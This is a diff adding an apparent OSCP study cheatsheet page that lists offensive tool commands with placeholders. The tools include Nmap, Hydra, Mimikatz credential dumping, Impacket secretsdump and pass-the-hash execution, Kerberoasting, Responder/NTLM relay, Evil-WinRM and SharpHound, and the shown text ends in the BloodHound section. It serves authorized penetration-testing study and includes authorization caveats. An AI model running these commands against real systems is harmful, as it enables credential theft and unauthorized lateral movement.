@@ -1,0 +1,358 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>Tool Command Reference — OSCP Reference</title><meta name="description" content="Plain OSCP reference: commands, explanations, interpretation and next checks."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/cheatsheets/tool-command-reference/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}#reference-index{box-sizing:border-box;background:#fff;border-right:1px solid #888;width:19rem;padding:.75rem 1rem;position:fixed;inset:0 auto 0 0;overflow:auto}#reference-index>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:15px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1.15rem}nav>ul{padding-left:1rem}nav li{margin:.3rem 0}nav summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin-left:19rem;padding:1rem 2rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:2em;line-height:1.15}h2{margin-top:1.7em;font-size:1.5em}h3{margin-top:1.5em;font-size:1.2em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}article summary{cursor:pointer}.skip{z-index:2;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width<=700px){html{scroll-padding-top:calc(32dvh + 1rem)}#reference-index{z-index:1;border-bottom:1px solid #888;border-right:0;width:100%;height:32dvh;inset:0 0 auto}main{margin-left:0;padding:calc(32dvh + 1rem) 1rem 2rem}body{font-size:16px}}
+</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><p><a href="/oscp/notes/ad-investigation/">AD Notes</a> · <a href="/oscp/notes/ad-investigation/quick-reference/">AD quick reference</a></p><details open><summary>On this page</summary><ul><li><a href="/oscp/cheatsheets/tool-command-reference/#recon-and-scanning">Recon and scanning</a><ul><li><a href="/oscp/cheatsheets/tool-command-reference/#nmap">Nmap</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#rustscan-and-masscan">RustScan and Masscan</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#ffuf-gobuster-and-feroxbuster">ffuf, Gobuster and Feroxbuster</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#nikto">Nikto</a></li></ul></li><li><a href="/oscp/cheatsheets/tool-command-reference/#service-tools">Service tools</a><ul><li><a href="/oscp/cheatsheets/tool-command-reference/#smb-and-rpc">SMB and RPC</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#ldapsearch">ldapsearch</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#freerdp">FreeRDP</a></li></ul></li><li><a href="/oscp/cheatsheets/tool-command-reference/#credential-tools">Credential tools</a><ul><li><a href="/oscp/cheatsheets/tool-command-reference/#hydra">Hydra</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#hashcat-and-john">Hashcat and John</a></li></ul></li><li><a href="/oscp/cheatsheets/tool-command-reference/#local-privilege-escalation-tools">Local privilege-escalation tools</a><ul><li><a href="/oscp/cheatsheets/tool-command-reference/#linpeas-lse-and-unix-privesc-check">LinPEAS, LSE and unix-privesc-check</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#pspy">pspy</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#responder-and-ntlm-relay">Responder and NTLM relay</a></li></ul></li><li><a href="/oscp/cheatsheets/tool-command-reference/#active-directory-tools">Active Directory tools</a><ul><li><a href="/oscp/cheatsheets/tool-command-reference/#powerview">PowerView</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#mimikatz">Mimikatz</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#rubeus">Rubeus</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#netexec--crackmapexec">NetExec / CrackMapExec</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#impacket-suite">Impacket suite</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#evil-winrm-winrs-and-powershell-remoting">Evil-WinRM, WinRS and PowerShell remoting</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#bloodhound-and-sharphound">BloodHound and SharpHound</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#certipy">Certipy</a></li></ul></li><li><a href="/oscp/cheatsheets/tool-command-reference/#web-exploitation-tools">Web exploitation tools</a><ul><li><a href="/oscp/cheatsheets/tool-command-reference/#sqlmap">SQLmap</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#wpscan">WPScan</a></li></ul></li><li><a href="/oscp/cheatsheets/tool-command-reference/#payload-and-pivot-tools">Payload and pivot tools</a><ul><li><a href="/oscp/cheatsheets/tool-command-reference/#searchsploit-and-exploit-toolchains">SearchSploit and exploit toolchains</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#msfvenom-multihandler-and-netcat">msfvenom, multi/handler and Netcat</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#windows-payload-control-evidence">Windows payload-control evidence</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#metasploit-restricted-module-workflow">Metasploit restricted module workflow</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#ssh-forwarding-and-proxychains">SSH forwarding and ProxyChains</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#socat-sshuttle-and-windows-relays">Socat, sshuttle and Windows relays</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#chisel-and-ligolo-ng">Chisel and Ligolo-ng</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#dnscat2">dnscat2</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/#evidence-capture-and-final-report-package">Evidence capture and final report package</a></li></ul></li><li><a href="/oscp/cheatsheets/tool-command-reference/#sources">Sources</a></li></ul></details><ul><li><details><summary>Operational procedures</summary><ul><li><details><summary><a href="/oscp/reference/01-discovery-scanning/">01 — Discovery and scanning</a></summary><ul><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/02-service-enumeration/">02 — Service enumeration</a></summary><ul><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">Memcached and WebDAV</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/03-initial-access/">03 — Initial access</a></summary><ul><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/04-shells-transfers-credentials/">04 — Shells, transfers and credentials</a></summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload Execution Obstacles</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/05-local-privilege-escalation/">05 — Local privilege escalation</a></summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Windows Privilege Escalation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/06-ad-lateral-movement/">06 — AD and lateral movement</a></summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/07-pivoting-tunneling/">07 — Pivoting and tunneling</a></summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/08-evidence-reporting/">08 — Evidence and reporting</a></summary><ul><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated Attack Tracking and Evidence</a></li></ul></details></li><li><a href="/oscp/reference/INDEX/">Complete operational task index</a></li></ul></details></li><li><details open><summary><a href="/oscp/cheatsheets/">Cheatsheets</a></summary><ul><li><a href="/oscp/cheatsheets/active-directory/">Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">Integrated Attack and Reporting Cheatsheet</a></li><li><a href="/oscp/cheatsheets/linux-privesc/">Linux Privilege Escalation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/" aria-current="page">Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/">Windows Privilege Escalation Cheatsheet</a></li></ul></details></li><li><details><summary>Study notes</summary><ul><li><a href="/oscp/notes/Attack_Strategy_Map/">Attack Strategy Map</a></li><li><a href="/oscp/notes/GetSH_Coverage/">getSH Source Coverage</a></li><li><a href="/oscp/notes/Master_Notes/">Master Notes</a></li><li><a href="/oscp/notes/Recognition_Practice/">Recognition practice</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">Attack-first OSCP speedrun breakdown</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/">AD Notes — focused checks</a></summary><ul><li><a href="/oscp/notes/ad-investigation/acl/">An ACL shows a powerful right — can I actually use it?</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">Can this account produce AS-REP roasting material?</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">How do I turn a BloodHound graph into a verified path?</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">When should I investigate AD CS, delegation or GPOs?</a></li><li><a href="/oscp/notes/ad-investigation/context/">What identity and domain am I actually using?</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">On a controlled host, where could useful credentials exist?</a></li><li><a href="/oscp/notes/ad-investigation/failure/">A command failed or returned nothing — what can I conclude?</a></li><li><a href="/oscp/notes/ad-investigation/files/">I found a script or configuration file — what matters?</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">Which computers can this identity access?</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">I found a service account — is Kerberoasting useful?</a></li><li><a href="/oscp/notes/ad-investigation/managed/">Can I read a LAPS or gMSA secret?</a></li><li><a href="/oscp/notes/ad-investigation/material/">I found a secret — what kind is it and where can I use it?</a></li><li><a href="/oscp/notes/ad-investigation/movement/">I have credentials — which remote-access method fits?</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">Which identity change follows from a validated object right?</a></li><li><a href="/oscp/notes/ad-investigation/policy/">How do I interpret password policy before testing credentials?</a></li><li><a href="/oscp/notes/ad-investigation/quick-reference/">AD — Quick Reference</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">How to read command output</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">I gained a new account or host — what do I check again?</a></li><li><a href="/oscp/notes/ad-investigation/replication/">Does this identity really have DCSync rights?</a></li><li><a href="/oscp/notes/ad-investigation/routes/">Is this an access failure or a missing route?</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">Expected behavior or useful weakness?</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">A privileged user has a session — what does that mean?</a></li><li><a href="/oscp/notes/ad-investigation/shares/">Which shares and files should I inspect first?</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">SMB or WMI execution — what must be true first?</a></li><li><a href="/oscp/notes/ad-investigation/spns/">What does an SPN tell me to investigate?</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">What does this Kerberos ticket actually allow?</a></li><li><a href="/oscp/notes/ad-investigation/users/">Where do I find useful users and group memberships?</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">WinRM or RDP — why would this account be allowed in?</a></li></ul></details></li><li><details><summary>Method guides</summary><ul><li><a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></li><li><a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a></li><li><a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a></li><li><a href="/oscp/notes/methods/discovery/">Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/execution/">Resolve payload execution obstacles</a></li><li><a href="/oscp/notes/methods/integration/">Complete attacks and retain reproducible evidence</a></li><li><a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></li><li><a href="/oscp/notes/methods/linux-privesc/">Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/pivoting/">Reach internal services</a></li><li><a href="/oscp/notes/methods/public-exploits/">Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/services/">Extract opportunities from services</a></li><li><a href="/oscp/notes/methods/sessions-transfers/">Establish sessions and move files</a></li><li><a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></li><li><a href="/oscp/notes/methods/web-mapping/">Map useful web behavior</a></li><li><a href="/oscp/notes/methods/windows-privesc/">Escalate privileges on Windows</a></li></ul></details></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><main id="document" tabindex="-1"><article><h1 id="tool-command-reference">Tool Command Reference</h1>
+<p><a href="/oscp/cheatsheets/">← Cheatsheet index</a> | <a href="/oscp/cheatsheets/tool-selection/">Selection matrix</a> | <a href="/oscp/notes/GetSH_Coverage/">getSH coverage</a> | <a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a></p>
+<p>This sheet accounts for the tools listed by the reviewed getSH Tool Cheatsheet. The linked task procedures remain canonical because they include prerequisites, interpretation and failure routing.</p>
+<h2 id="recon-and-scanning">Recon and scanning</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-bash">nmap -Pn -sS -p- TARGET -oA full-tcp
+nmap -Pn -sV -sC -p PORTS TARGET -oA services
+sudo nmap -Pn -sU --top-ports 100 TARGET -oA udp-100
+</code></pre>
+<blockquote>
+<p>Direct/raw scanning baseline; connect scan <code>-sT</code> when raw packets are unavailable or through a TCP SOCKS route. <a href="/oscp/reference/01-discovery-scanning/">Procedure</a></p>
+</blockquote>
+<h3 id="rustscan-and-masscan">RustScan and Masscan</h3>
+<pre><code class="language-bash">rustscan -a TARGET -r 1-65535 --ulimit 5000 -- -Pn -sV -sC -oA rustscan-followup
+sudo masscan TARGET -p1-65535 --rate 500 -oL masscan.txt
+</code></pre>
+<blockquote>
+<p>Validate fast-discovery hits with Nmap; neither command covers UDP. <a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Procedure</a></p>
+</blockquote>
+<h3 id="ffuf-gobuster-and-feroxbuster">ffuf, Gobuster and Feroxbuster</h3>
+<pre><code class="language-bash">ffuf -w WORDLIST -u http://TARGET:PORT/FUZZ -ac -o ffuf.json
+gobuster dir -u http://TARGET:PORT/ -w WORDLIST -x php,txt,bak,old,zip -o gobuster.txt
+feroxbuster -u http://TARGET:PORT/ -w WORDLIST -x php,txt,bak,old,zip -o ferox.txt
+</code></pre>
+<blockquote>
+<p>Calibrate against random paths; results are candidates. <a href="/oscp/cheatsheets/web-mapping/">Web mapping</a></p>
+</blockquote>
+<h3 id="nikto">Nikto</h3>
+<pre><code class="language-bash">nikto -h http://TARGET:PORT -output nikto.txt
+</code></pre>
+<blockquote>
+<p>Manually reproduce useful candidates. <a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Procedure</a></p>
+</blockquote>
+<h2 id="service-tools">Service tools</h2>
+<h3 id="smb-and-rpc">SMB and RPC</h3>
+<pre><code class="language-bash">smbclient -L //TARGET -N
+smbclient //TARGET/SHARE -U 'DOMAIN/USER'
+rpcclient -U '' -N TARGET
+nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
+</code></pre>
+<blockquote>
+<p>Null, guest and authenticated views differ. <a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB procedure</a></p>
+</blockquote>
+<h3 id="ldapsearch">ldapsearch</h3>
+<pre><code class="language-bash">ldapsearch -x -LLL -H ldap://DC_IP:389 -s base -b '' defaultNamingContext dnsHostName
+ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W -b 'DC=DOMAIN,DC=TLD' '(objectClass=user)' sAMAccountName memberOf
+</code></pre>
+<blockquote>
+<p><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP/Kerberos procedure</a></p>
+</blockquote>
+<h3 id="freerdp">FreeRDP</h3>
+<pre><code class="language-bash">xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard
+xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution
+
+# Older package name
+xfreerdp /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard
+</code></pre>
+<blockquote>
+<p>Prefer password prompting instead of retained shell history. <code>/pth</code> invokes Restricted Admin behavior: the target must permit it and the identity must be an administrator. Ordinary RDP instead needs an effective remote-interactive logon right. <a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP procedure</a> and <a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">lateral movement</a></p>
+</blockquote>
+<h2 id="credential-tools">Credential tools</h2>
+<h3 id="hydra">Hydra</h3>
+<p>Use only after explicit authorization, a confirmed endpoint, known usernames and lockout/rate-limit review.</p>
+<pre><code class="language-bash">hydra -l USER -P PASSWORDS -s PORT ssh://TARGET -t 4 -f
+hydra -L USERS -p ONE_PASSWORD -s PORT ftp://TARGET -t 4 -f
+</code></pre>
+<p>HTTP form syntax depends on the exact request and failure marker:</p>
+<pre><code class="language-bash">hydra -l USER -P PASSWORDS TARGET http-post-form \
+  '/login:username=^USER^&#x26;password=^PASS^:F=Invalid credentials'
+</code></pre>
+<blockquote>
+<p>Capture the form with Burp/curl first. Stop on lockout/rate-limit evidence. Password spraying is not the same as brute forcing.</p>
+</blockquote>
+<h3 id="hashcat-and-john">Hashcat and John</h3>
+<pre><code class="language-bash">hashcat -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m MODE hashes.txt --show
+john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt
+john --show hash.txt
+</code></pre>
+<blockquote>
+<p><a href="/oscp/cheatsheets/credentials-cracking/">Credential cheatsheet</a></p>
+</blockquote>
+<h2 id="local-privilege-escalation-tools">Local privilege-escalation tools</h2>
+<h3 id="linpeas-lse-and-unix-privesc-check">LinPEAS, LSE and unix-privesc-check</h3>
+<pre><code class="language-bash">./linpeas.sh | tee linpeas.txt
+./lse.sh | tee lse.txt
+./lse.sh -l1 | tee lse-l1.txt
+./unix-privesc-check standard > unix-privesc-check.txt
+</code></pre>
+<blockquote>
+<p>Generate candidates, then prove the exact object, effective permission, privileged consumer, identity and trigger. LinPEAS <code>-a</code> is intentionally not the baseline: upstream documents longer/noisier checks including process monitoring and password attempts. LSE <code>-l2</code> and <code>unix-privesc-check detailed</code> are later depth. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux procedure</a></p>
+</blockquote>
+<h3 id="pspy">pspy</h3>
+<pre><code class="language-bash">./pspy64
+./pspy64 -pf -i 1000
+</code></pre>
+<blockquote>
+<p>Default output watches processes; <code>-f</code> adds filesystem events and <code>-i 1000</code> scans procfs every second. An observed UID/command proves execution, not control over its inputs. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#6-cron-timers-and-services">Linux procedure</a></p>
+</blockquote>
+<h3 id="responder-and-ntlm-relay">Responder and NTLM relay</h3>
+<pre><code class="language-bash">sudo responder -I INTERFACE
+impacket-ntlmrelayx -tf targets.txt -smb2support
+</code></pre>
+<blockquote>
+<p>Authorized labs only: poisoning/spoofing is prohibited by the current OSCP+ exam guide. Relay additionally requires a victim authentication event, reachable compatible target and protections/configuration that permit relay. Do not use as a default credential step.</p>
+</blockquote>
+<h2 id="active-directory-tools">Active Directory tools</h2>
+<h3 id="powerview">PowerView</h3>
+<pre><code class="language-powershell">Import-Module .\PowerView.ps1
+Get-DomainUser
+Get-DomainGroup
+Get-DomainComputer
+Get-DomainUser -SPN
+Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs
+</code></pre>
+<h3 id="mimikatz">Mimikatz</h3>
+<pre><code class="language-text">mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::tickets
+lsadump::sam
+</code></pre>
+<blockquote>
+<p>Requires suitable local privilege/protection state. Treat output as sensitive. <a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">Credential-access procedure</a></p>
+</blockquote>
+<h3 id="rubeus">Rubeus</h3>
+<pre><code class="language-cmd">Rubeus.exe triage
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+Rubeus.exe kerberoast /nowrap /outfile:kerberoast.txt
+Rubeus.exe ptt /ticket:ticket.kirbi
+</code></pre>
+<blockquote>
+<p><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos procedure</a></p>
+</blockquote>
+<h3 id="netexec--crackmapexec">NetExec / CrackMapExec</h3>
+<pre><code class="language-bash">nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD'
+nxc smb TARGET -d DOMAIN -u USER -H NT_HASH
+nxc smb TARGET -u Administrator -H NT_HASH --local-auth
+nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
+nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' -x "hostname &#x26; whoami" --exec-method wmiexec
+nxc winrm TARGET -d DOMAIN -u USER -p 'PASSWORD'
+</code></pre>
+<blockquote>
+<p>Prefer the maintained <code>nxc</code>; older installations may expose <code>crackmapexec</code>. <code>(Pwn3d!)</code> is an SMB admin-context cue, not universal execution proof. Current SMB execution methods include <code>wmiexec</code>, <code>atexec</code> and <code>smbexec</code>; force one while diagnosing instead of hiding method-specific failure behind fallback.</p>
+</blockquote>
+<h3 id="impacket-suite">Impacket suite</h3>
+<pre><code class="language-bash">impacket-GetNPUsers DOMAIN/ -no-pass -request -usersfile users.txt -dc-ip DC_IP -outputfile asrep.txt
+impacket-GetUserSPNs -request -dc-ip DC_IP -outputfile tgs.txt 'DOMAIN/USER:PASSWORD'
+impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
+impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET'
+impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
+impacket-smbexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
+impacket-atexec -hashes :NT_HASH 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname &#x26; whoami"
+impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
+impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
+impacket-mssqlclient 'DOMAIN/USER:PASSWORD@TARGET' -windows-auth
+</code></pre>
+<p>Kerberos cache with separate naming and routing:</p>
+<pre><code class="language-bash">export KRB5CCNAME="$PWD/USER.ccache"
+impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'
+impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'
+</code></pre>
+<blockquote>
+<p>Script names may include or omit the <code>impacket-</code> prefix by package. Inspect <code>-h</code> locally. Use the SPN-matching hostname in the target string and <code>-target-ip</code> for routing. Current Impacket DCOMExec rejects Kerberos; use WMIExec for that context. <a href="/oscp/reference/06-ad-lateral-movement/">AD procedures</a></p>
+</blockquote>
+<h3 id="evil-winrm-winrs-and-powershell-remoting">Evil-WinRM, WinRS and PowerShell remoting</h3>
+<pre><code class="language-bash">evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD'
+evil-winrm -i TARGET_HOST -u USER -H NT_HASH
+evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' -S -P 5986
+evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP
+</code></pre>
+<pre><code class="language-cmd">winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname &#x26; whoami"
+</code></pre>
+<pre><code class="language-powershell">Test-WSMan TARGET_HOST
+$Credential = Get-Credential 'DOMAIN\USER'
+Invoke-Command -ComputerName TARGET_HOST -Credential $Credential -ScriptBlock { hostname; whoami /all }
+</code></pre>
+<blockquote>
+<p>Needs an enabled 5985/5986 listener and endpoint authorization. Kerberos uses the target FQDN/SPN. IP-based PowerShell remoting requires explicit credentials and normally HTTPS or a tightly scoped TrustedHosts entry; do not weaken global trust to disguise a DNS/SPN error. <a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral movement</a></p>
+</blockquote>
+<h3 id="bloodhound-and-sharphound">BloodHound and SharpHound</h3>
+<pre><code class="language-powershell">.\SharpHound.exe -c All --zipfilename sharphound.zip
+</code></pre>
+<pre><code class="language-bash">bloodhound-python -u USER -p 'PASSWORD' -d DOMAIN -ns DC_IP -dc DC_HOST -c All --zip
+</code></pre>
